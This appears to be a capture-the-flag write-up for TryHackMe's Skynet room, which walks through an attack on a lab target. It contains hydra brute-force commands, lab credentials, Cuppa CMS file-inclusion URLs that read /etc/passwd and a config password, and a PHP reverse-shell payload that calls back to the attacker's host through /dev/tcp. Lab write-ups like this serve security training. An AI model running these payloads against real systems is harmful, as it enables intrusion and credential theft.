# TryHackMe - Skynet  
🔗 https://tryhackme.com/room/skynet  
🎯 Objective: Exploit Samba and CMS vulnerabilities to gain initial access and privilege escalation.

---

## 🖥️ Target Information

| Property     | Value                                           |
|--------------|-------------------------------------------------|
| IP Address   | 10.10.15.79                                     |
| Services     | 22 (SSH), 80 (HTTP), 110 (POP3), 139/445 (SMB), 143 (IMAP) |
| OS           | Ubuntu (inferred from OpenSSH and Apache)      |
| CMS Detected | Cuppa CMS                                       |

---

## 🔍 1. Enumeration

### Nmap
```bash
nmap -sV -O 10.10.15.79
```

### Gobuster
```bash
gobuster dir -u http://10.10.15.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php
```

Discovered:
- /admin
- /config
- /css
- /js
- /ai
- /squirrelmail
- /45kra24zxs28v3yd
- /server-status (403)

---

## 📁 2. Samba Enumeration

### List shares
```bash
smbclient -L //10.10.15.79 -N
```

Shares:
- anonymous
- milesdyson

### Access anonymous share
```bash
smbclient //10.10.15.79/anonymous -N
```

Retrieved:
- `attention.txt`: system malfunction and password changes notice

---

## 🔐 3. POP3 & SMB Brute Force

### POP3 (hydra)
```bash
hydra -l miles -P /usr/share/wordlists/rockyou.txt -f -o found.txt pop3://10.10.15.79
```

Also tried:
```bash
hydra -l miles -P log1.txt pop3://10.10.15.79
```

### SMB brute force
```bash
hydra -l milesdyson -P log1.txt smb://10.10.15.79 -V
```

✅ Login credentials:
- User: `milesdyson`
- Password: `cyborg007haloterminator`

Accessed mailbox and found:
```
Your new smb password is: )s{A&2Z=F^n_E.B`
```

---

## 📦 4. SMB Share (milesdyson)

```bash
smbclient //10.10.15.79/milesdyson -U milesdyson
```

Password: `)s{A&2Z=F^n_E.B`

Downloaded:
- `important.txt`: reveals secret CMS path: `/45kra24zxs28v3yd`

---

## 🌐 5. CMS Analysis

Found Cuppa CMS at:
```
http://10.10.15.79/45kra24zxs28v3yd/administrator
```

Searchsploit:
```bash
searchsploit cuppa
```

Identified:
- Local File Inclusion via `urlConfig` in `alertConfigField.php`

---

## 🧪 6. File Inclusion Exploitation

Read `/etc/passwd`:
```
http://10.10.15.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd
```

Base64 read Configuration.php:
```
http://10.10.15.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

Decoded password:
```php
public $password = "Db@dmin";
```

---

## 💥 7. RCE via RFI (Reverse Shell)

Craft RFI:
```bash
curl "http://10.10.15.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.140.194:8000/aaa.php"
```

`aaa.php` contents:
```php
<?php system('bash -i >& /dev/tcp/10.10.140.194/12345 0>&1'); ?>
```

Serve malicious file:
```bash
python3 -m http.server 8000
```

Listener:
```bash
nc -lvnp 12345
```

Spawn TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## ✅ Summary

| Phase                   | Status                       |
|------------------------|------------------------------|
| Enumeration             | ✅ Nmap, Gobuster             |
| Samba Access            | ✅ Shares discovered          |
| Password Disclosure     | ✅ POP3 & SMB brute forced    |
| CMS Access              | ✅ Found hidden path          |
| RFI Exploit             | ✅ Configuration.php leaked   |
| Reverse Shell           | ✅ Achieved via RFI + listener|

Next: Privilege Escalation (if needed)
